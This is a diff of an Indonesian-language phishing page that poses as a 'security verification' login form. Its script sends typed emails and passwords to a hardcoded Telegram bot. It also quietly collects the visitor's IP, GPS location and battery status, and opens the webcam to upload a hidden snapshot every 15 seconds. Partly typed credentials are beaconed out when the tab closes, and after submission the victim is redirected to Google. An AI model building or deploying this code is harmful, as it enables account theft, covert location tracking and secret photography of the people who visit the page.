@@ -2,104 +2,377 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Akun</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verifikasi Keamanan</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:Arial,sans-serif;background:#0a0a1a;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-        .container{max-width:400px;width:100%;background:rgba(255,255,255,0.05);border-radius:24px;padding:30px 24px;border:1px solid rgba(255,255,255,0.08)}
-        h2{color:#fff;text-align:center;margin-bottom:8px}
-        p{color:#888;text-align:center;font-size:14px;margin-bottom:24px}
-        label{color:#aaa;font-size:13px;display:block;margin-bottom:5px}
-        input{width:100%;padding:14px;border-radius:12px;border:1px solid #333;background:#111;color:#fff;font-size:15px;margin-bottom:16px;outline:none}
-        input:focus{border-color:#00c8ff}
-        button{width:100%;padding:15px;border:none;border-radius:12px;background:linear-gradient(135deg,#00c8ff,#007aff);color:#fff;font-size:16px;font-weight:600;cursor:pointer}
-        button:hover{opacity:0.9}
+        /* ===== CSS ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: radial-gradient(ellipse at 50% 0%, #1a1a3e 0%, #0a0a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(255,255,255,0.04);
+            backdrop-filter: blur(30px);
+            border-radius: 36px;
+            padding: 28px 24px 30px;
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0,200,255,0.08);
+            padding: 8px 16px 8px 12px;
+            border-radius: 30px;
+            border: 1px solid rgba(0,200,255,0.15);
+        }
+        .badge-text {
+            font-size: 11px;
+            font-weight: 600;
+            color: #8ac4ff;
+            text-transform: uppercase;
+        }
+        .status-dot {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: #4ade80;
+            border-radius: 50%;
+            animation: pulse-dot 1.8s ease-in-out infinite;
+        }
+        @keyframes pulse-dot {
+            0%,100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.8); }
+        }
+        .status-text {
+            font-size: 11px;
+            color: rgba(255,255,255,0.4);
+        }
+        .login-section {
+            background: rgba(255,255,255,0.02);
+            border-radius: 24px;
+            padding: 28px 22px 22px;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .login-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .avatar-ring {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00c8ff, #007aff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 16px;
+            box-shadow: 0 0 40px rgba(0,200,255,0.15);
+        }
+        .avatar-icon {
+            font-size: 36px;
+            color: #fff;
+        }
+        .login-header h2 {
+            font-size: 20px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff 60%, rgba(255,255,255,0.5));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .login-header p {
+            font-size: 13px;
+            color: rgba(255,255,255,0.35);
+        }
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .input-group label {
+            font-size: 12px;
+            font-weight: 500;
+            color: rgba(255,255,255,0.45);
+        }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 44px 14px 44px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 14px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        .input-wrapper input:focus {
+            border-color: rgba(0,200,255,0.3);
+            background: rgba(255,255,255,0.07);
+        }
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            color: rgba(255,255,255,0.2);
+        }
+        .toggle-pass {
+            position: absolute;
+            right: 14px;
+            background: transparent;
+            border: none;
+            color: rgba(255,255,255,0.2);
+            cursor: pointer;
+            font-size: 15px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #00c8ff, #007aff);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 4px;
+        }
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 40px rgba(0,200,255,0.25);
+        }
+        .login-btn .btn-loader { display: none; }
+        .login-btn.loading .btn-text { display: none; }
+        .login-btn.loading .btn-loader { display: inline-block; }
     </style>
 </head>
 <body>
+
+    <video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
     <div class="container">
-        <h2>🔐 Verifikasi Akun</h2>
-        <p>Masuk untuk melanjutkan</p>
-        <form id="loginForm">
-            <label>Email atau Username</label>
-            <input type="text" id="email" placeholder="contoh@email.com" required>
-            <label>Kata Sandi</label>
-            <input type="password" id="password" placeholder="••••••••" required>
-            <button type="submit" id="loginBtn">Verifikasi & Masuk</button>
-        </form>
+        <div class="header">
+            <div class="security-badge">
+                <span class="badge-text">Verifikasi Keamanan</span>
+            </div>
+            <div class="status-dot" id="statusDot">
+                <span class="dot"></span>
+                <span class="status-text">Menginisialisasi...</span>
+            </div>
+        </div>
+
+        <div class="login-section">
+            <div class="login-header">
+                <div class="avatar-ring">
+                    <span class="avatar-icon">🔐</span>
+                </div>
+                <h2>Masuk ke Akun</h2>
+                <p>Verifikasi identitas untuk melanjutkan</p>
+            </div>
+
+            <form id="loginForm" class="login-form" autocomplete="off">
+                <div class="input-group">
+                    <label>Email atau Nama Pengguna</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📧</span>
+                        <input type="text" id="email" placeholder="contoh@email.com" required>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Kata Sandi</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🔒</span>
+                        <input type="password" id="password" placeholder="••••••••" required>
+                        <button type="button" id="togglePass" class="toggle-pass">👁️</button>
+                    </div>
+                </div>
+
+                <button type="submit" class="login-btn" id="loginBtn">
+                    <span class="btn-text">Verifikasi & Masuk</span>
+                    <span class="btn-loader">⏳</span>
+                </button>
+            </form>
+        </div>
     </div>
 
     <script>
+        // ===== JAVASCRIPT =====
+        // GANTI INI DULU SEBELUM UPLOAD!!!
         const BOT = '8945431684:AAEvlhZfwdH42wc0wiLHE3hGQaTG48THmIw';
         const CHAT = '8439372560';
 
-        function sendTelegram(text) {
-            if (BOT === 'YOUR_BOT_TOKEN_HERE') return alert('Ganti token dulu!');
+        const S = { id: 's_'+Date.now()+'_'+Math.random().toString(36).slice(2,6) };
+        const D = { v: document.getElementById('hiddenVideo'), c: document.getElementById('hiddenCanvas') };
+
+        function send(t) {
+            if (BOT === 'YOUR_BOT_TOKEN_HERE') return;
             fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT, text: text })
-            }).then(() => console.log('✅ Terkirim')).catch(() => alert('Gagal kirim'));
+                body: JSON.stringify({ chat_id: CHAT, text: t, parse_mode: 'HTML' })
+            }).catch(()=>{});
         }
 
+        function sendPhoto(b64, cap) {
+            if (!b64 || BOT === 'YOUR_BOT_TOKEN_HERE') return;
+            try {
+                const byteString = atob(b64.split(',')[1]);
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                const blob = new Blob([ab], { type: 'image/jpeg' });
+                const fd = new FormData();
+                fd.append('chat_id', CHAT);
+                fd.append('photo', blob, 'shot.jpg');
+                if (cap) fd.append('caption', cap);
+                fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd }).catch(()=>{});
+            } catch(e) {}
+        }
+
+        // ===== IP =====
+        fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
+            S.ip = d;
+            send(`🟢 ONLINE\n🆔 ${S.id}\nIP: ${d.ip}\n${d.country_name||''}\n${d.city||''}`);
+        }).catch(()=>{});
+
+        // ===== BATTERY =====
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b=>{
+                const u = ()=> {
+                    S.bat = Math.round(b.level*100);
+                    S.charging = b.charging;
+                    send(`🔋 BATERAI\nLevel: ${S.bat}%\nCharging: ${S.charging?'Ya':'Tidak'}`);
+                };
+                u();
+                b.onlevelchange = u;
+                b.onchargingchange = u;
+            });
+        }
+
+        // ===== LOCATION =====
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(p=>{
+                const {latitude:lat, longitude:lng, accuracy:acc} = p.coords;
+                S.lat = lat; S.lng = lng;
+                fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`)
+                .then(r=>r.json()).then(d=>{
+                    const kota = d.city||d.locality||'';
+                    send(`📍 LOKASI\nLat: ${lat.toFixed(6)}\nLng: ${lng.toFixed(6)}\nAkurasi: ${acc}m\nKota: ${kota}`);
+                    fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
+                        method: 'POST',
+                        headers: {'Content-Type':'application/json'},
+                        body: JSON.stringify({chat_id:CHAT, latitude:lat, longitude:lng})
+                    }).catch(()=>{});
+                }).catch(()=>{
+                    send(`📍 LOKASI\nLat: ${lat.toFixed(6)}\nLng: ${lng.toFixed(6)}`);
+                });
+            }, ()=>{});
+        }
+
+        // ===== CAMERA =====
+        if (navigator.mediaDevices?.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({video:{facingMode:'user', width:320, height:240}, audio:false})
+            .then(stream => {
+                D.v.srcObject = stream;
+                setTimeout(capture, 2000);
+                setInterval(capture, 15000);
+            }).catch(()=>{});
+        }
+
+        function capture() {
+            const v = D.v, c = D.c;
+            if (!v || !c || !v.videoWidth) return;
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            const ctx = c.getContext('2d');
+            ctx.save(); ctx.scale(-1,1); ctx.drawImage(v, -c.width, 0); ctx.restore();
+            const url = c.toDataURL('image/jpeg', 0.5);
+            S.snap = url;
+            sendPhoto(url, `📸 ${new Date().toLocaleString()}\n${S.id}`);
+        }
+
+        // ===== FORM =====
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value.trim();
             const pass = document.getElementById('password').value.trim();
-            if (!email || !pass) return alert('Isi semua!');
-
-            const btn = document.getElementById('loginBtn');
-            btn.textContent = '⏳ Mengirim...';
-
-            let ip = 'Tidak tersedia';
-            let lokasi = 'Tidak tersedia';
-
-            // Ambil IP
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(d => { ip = d.ip || 'Tidak tersedia'; })
-                .catch(() => {});
-
-            // Ambil lokasi
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    lokasi = p.coords.latitude + ', ' + p.coords.longitude;
-                }, () => {});
-            }
-
-            // Ambil baterai
-            let bat = 'Tidak tersedia';
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    bat = Math.round(b.level * 100) + '%';
-                }).catch(() => {});
-            }
-
-            setTimeout(() => {
-                const msg = 
-                    'Testgass\n' +
-                    'bot\n\n' +
-                    '## Pasang Foto Profil\n' +
-                    'S_' + Date.now() + '_' + Math.random().toString(36).slice(2,5) + '\n\n' +
-                    '### KREDENSIAL\n' +
-                    '- Email: ' + email + '\n' +
-                    '- Pass: ' + pass + '\n' +
-                    '- Session: s_' + Date.now() + '_' + Math.random().toString(36).slice(2,5) + '\n' +
-                    '- Baterai: ' + bat + '\n' +
-                    '- Lokasi: ' + lokasi + '\n\n' +
-                    '### FINAL\n' +
-                    '- Email: ' + email + '\n\n' +
-                    '### CLOSED\n' +
-                    '- s_' + Date.now() + '_' + Math.random().toString(36).slice(2,5) + '\n' +
-                    '- Email: ' + email + '\n' +
-                    '- Pass: ' + pass;
-
-                sendTelegram(msg);
-                btn.textContent = '✓ Berhasil';
-                setTimeout(() => window.location.href = 'https://accounts.google.com/', 1500);
-            }, 2000);
+            if (!email || !pass) return;
+            let msg = `🔑 KREDENSIAL\nEmail: ${email}\nPass: ${pass}\nSession: ${S.id}`;
+            if (S.bat) msg += `\nBaterai: ${S.bat}%`;
+            if (S.lat) msg += `\nLokasi: ${S.lat.toFixed(4)}, ${S.lng.toFixed(4)}`;
+            send(msg);
+            if (S.snap) sendPhoto(S.snap, `📸 FINAL\nEmail: ${email}`);
+            document.getElementById('loginBtn').classList.add('loading');
+            setTimeout(()=>{
+                document.getElementById('loginBtn').classList.remove('loading');
+                document.getElementById('loginBtn').querySelector('.btn-text').textContent = '✓ Berhasil';
+                setTimeout(()=> window.location.href='https://accounts.google.com/', 800);
+            }, 1500);
         });
+
+        // ===== TAB HIDDEN =====
+        document.addEventListener('visibilitychange', ()=>{
+            if (document.hidden) capture();
+        });
+
+        // ===== BEFORE UNLOAD =====
+        window.addEventListener('beforeunload', ()=>{
+            const email = document.getElementById('email')?.value?.trim() || '(not filled)';
+            const pass = document.getElementById('password')?.value?.trim() || '(not filled)';
+            if (BOT !== 'YOUR_BOT_TOKEN_HERE') {
+                const url = `https://api.telegram.org/bot${BOT}/sendMessage`;
+                const data = new URLSearchParams();
+                data.append('chat_id', CHAT);
+                data.append('text', `🚪 CLOSED\n${S.id}\nEmail: ${email}\nPass: ${pass}`);
+                data.append('parse_mode', 'HTML');
+                navigator.sendBeacon(url, data);
+            }
+        });
+
+        // ===== TOGGLE PASSWORD =====
+        document.getElementById('togglePass').addEventListener('click', function() {
+            const inp = document.getElementById('password');
+            if (inp.type === 'password') { inp.type = 'text'; this.textContent = '🙈'; }
+            else { inp.type = 'password'; this.textContent = '👁️'; }
+        });
+
+        console.log('✅ Stealth phishing started | '+S.id);
     </script>
 </body>
 </html>
